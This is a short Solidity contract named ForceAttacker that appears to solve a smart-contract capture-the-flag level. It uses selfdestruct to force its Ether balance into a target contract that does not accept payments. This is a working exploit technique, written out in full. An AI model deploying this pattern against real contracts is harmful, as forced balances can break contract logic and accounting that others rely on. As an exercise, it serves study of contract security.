pragma solidity ^0.7.3;

contract ForceAttacker {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() external payable {
        // Force existing balance into the target contract
        selfdestruct(target);
    }

    receive() external payable {}
}
